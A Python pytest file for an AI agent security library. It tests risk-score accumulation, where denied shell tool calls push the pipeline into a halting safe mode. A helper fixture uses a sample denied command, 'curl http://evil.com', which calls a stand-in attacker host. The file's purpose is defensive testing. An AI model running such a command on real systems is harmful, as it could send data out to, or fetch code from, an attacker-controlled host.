"""Tests for risk_score.py: RiskScoreAccumulator, RiskAwareHook, RiskAwareShieldFactory."""
from __future__ import annotations


from veronica_core.security.capabilities import CapabilitySet
from veronica_core.security.policy_engine import PolicyEngine
from veronica_core.security.risk_score import (
    RiskAwareHook,
    RiskAwareShieldFactory,
    RiskScoreAccumulator,
    RiskScoreConfig,
)
from veronica_core.shield.types import Decision, ToolCallContext


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


def _ctx(request_id: str = "req-1") -> ToolCallContext:
    return ToolCallContext(request_id=request_id)


def _deny_ctx(action: str = "shell", args: list[str] | None = None) -> ToolCallContext:
    """Build a context that PolicyEngine will DENY (e.g. curl)."""
    return ToolCallContext(
        request_id="deny-req",
        metadata={"action": action, "args": args or ["curl", "http://evil.com"]},
    )


def _allow_ctx() -> ToolCallContext:
    """Build a context that PolicyEngine will ALLOW (pytest)."""
    return ToolCallContext(
        request_id="allow-req",
        metadata={"action": "shell", "args": ["pytest"]},
    )


# ---------------------------------------------------------------------------
# RiskScoreAccumulator tests
# ---------------------------------------------------------------------------


class TestRiskScoreAccumulator:
    def test_initial_score_is_zero(self) -> None:
        acc = RiskScoreAccumulator()
        assert acc.current_score == 0

    def test_initial_is_not_safe_mode(self) -> None:
        acc = RiskScoreAccumulator()
        assert acc.is_safe_mode is False

    def test_three_denies_accumulate_score(self) -> None:
        """3 DENY operations with delta=8 each → score=24."""
        config = RiskScoreConfig(deny_threshold=20)
        acc = RiskScoreAccumulator(config=config)
        acc.add(8, "DENY")
        acc.add(8, "DENY")
        acc.add(8, "DENY")
        assert acc.current_score == 24

    def test_safe_mode_triggers_after_deny_threshold(self) -> None:
        """After crossing deny_threshold, is_safe_mode becomes True."""
        config = RiskScoreConfig(deny_threshold=20)
        acc = RiskScoreAccumulator(config=config)
        acc.add(8, "DENY")
        acc.add(8, "DENY")
        assert acc.is_safe_mode is False  # 16 < 20
        acc.add(8, "DENY")
        assert acc.is_safe_mode is True  # 24 >= 20

    def test_reset_clears_score_and_safe_mode(self) -> None:
        """reset() sets score to 0 and is_safe_mode to False."""
        config = RiskScoreConfig(deny_threshold=5)
        acc = RiskScoreAccumulator(config=config)
        acc.add(10, "DENY")
        assert acc.is_safe_mode is True
        acc.reset()
        assert acc.current_score == 0
        assert acc.is_safe_mode is False

    def test_window_size_limits_entries(self) -> None:
        """Only the last window_size entries are counted."""
        config = RiskScoreConfig(deny_threshold=1000, window_size=3)
        acc = RiskScoreAccumulator(config=config)
        for _ in range(5):
            acc.add(1, "DENY")
        # Only last 3 should be kept
        assert acc.current_score == 3

    def test_reset_on_allow_clears_window(self) -> None:
        """With reset_on_allow=True, an ALLOW verdict clears the window."""
        config = RiskScoreConfig(deny_threshold=100, reset_on_allow=True)
        acc = RiskScoreAccumulator(config=config)
        acc.add(5, "DENY")
        acc.add(5, "DENY")
        assert acc.current_score == 10
        acc.add(0, "ALLOW")
        # reset_on_allow clears window after adding the ALLOW entry
        assert acc.current_score == 0


# ---------------------------------------------------------------------------
# RiskAwareHook tests
# ---------------------------------------------------------------------------


class TestRiskAwareHook:
    def _make_hook(
        self, config: RiskScoreConfig | None = None
    ) -> tuple[RiskAwareHook, RiskScoreAccumulator]:
        from veronica_core.security.policy_engine import PolicyHook

        engine = PolicyEngine()
        caps = CapabilitySet.dev()
        inner = PolicyHook(engine=engine, caps=caps)
        acc = RiskScoreAccumulator(config=config)
        hook = RiskAwareHook(inner=inner, accumulator=acc)
        return hook, acc

    def test_allow_tool_call_passes_through(self) -> None:
        hook, acc = self._make_hook()
        result = hook.before_tool_call(_allow_ctx())
        assert result == Decision.ALLOW
        assert acc.current_score == 0

    def test_deny_tool_call_accumulates_score(self) -> None:
        hook, acc = self._make_hook()
        result = hook.before_tool_call(_deny_ctx())
        assert result == Decision.HALT
        assert acc.current_score > 0

    def test_safe_mode_halts_before_llm_call(self) -> None:
        """When is_safe_mode, before_llm_call returns HALT immediately."""
        config = RiskScoreConfig(deny_threshold=5)
        hook, acc = self._make_hook(config=config)
        # Manually trigger SAFE_MODE
        acc.add(10, "DENY")
        assert acc.is_safe_mode is True
        result = hook.before_llm_call(_ctx())
        assert result == Decision.HALT

    def test_safe_mode_halts_allow_operation(self) -> None:
        """ALLOW operation while in SAFE_MODE → still HALT."""
        config = RiskScoreConfig(deny_threshold=5)
        hook, acc = self._make_hook(config=config)
        acc.add(10, "DENY")
        assert acc.is_safe_mode is True
        # Even a normally-ALLOW context gets HALT when in SAFE_MODE
        result = hook.before_tool_call(_allow_ctx())
        assert result == Decision.HALT

    def test_before_llm_call_allows_when_not_safe_mode(self) -> None:
        """before_llm_call returns ALLOW when not in SAFE_MODE."""
        hook, acc = self._make_hook()
        result = hook.before_llm_call(_ctx())
        assert result == Decision.ALLOW


# ---------------------------------------------------------------------------
# RiskAwareShieldFactory tests
# ---------------------------------------------------------------------------


class TestRiskAwareShieldFactory:
    def test_factory_creates_pipeline_and_accumulator(self) -> None:
        engine = PolicyEngine()
        caps = CapabilitySet.dev()
        pipeline, acc = RiskAwareShieldFactory.create(engine, caps, repo_root=".")
        assert pipeline is not None
        assert acc is not None

    def test_factory_pipeline_halts_deny_action(self) -> None:
        engine = PolicyEngine()
        caps = CapabilitySet.dev()
        pipeline, acc = RiskAwareShieldFactory.create(engine, caps, repo_root=".")
        result = pipeline.before_tool_call(_deny_ctx())
        assert result == Decision.HALT
        assert acc.current_score > 0

    def test_factory_safe_mode_from_accumulated_denies(self) -> None:
        """After enough denies via the pipeline, accumulator enters SAFE_MODE."""
        config = RiskScoreConfig(deny_threshold=10)
        engine = PolicyEngine()
        caps = CapabilitySet.dev()
        pipeline, acc = RiskAwareShieldFactory.create(
            engine, caps, repo_root=".", risk_config=config
        )
        # Each curl deny has risk_score_delta=5 (SHELL_DENY_DEFAULT for curl... actually curl → SHELL_DENY_CMD = 8)
        # Two denies of delta=8 each → 16 >= 10 → SAFE_MODE
        pipeline.before_tool_call(_deny_ctx())
        pipeline.before_tool_call(_deny_ctx())
        assert acc.is_safe_mode is True

    def test_factory_accumulator_reset(self) -> None:
        """reset() on accumulator returned by factory clears SAFE_MODE."""
        config = RiskScoreConfig(deny_threshold=5)
        engine = PolicyEngine()
        caps = CapabilitySet.dev()
        pipeline, acc = RiskAwareShieldFactory.create(
            engine, caps, repo_root=".", risk_config=config
        )
        pipeline.before_tool_call(_deny_ctx())
        assert acc.is_safe_mode is True
        acc.reset()
        assert acc.is_safe_mode is False
        assert acc.current_score == 0
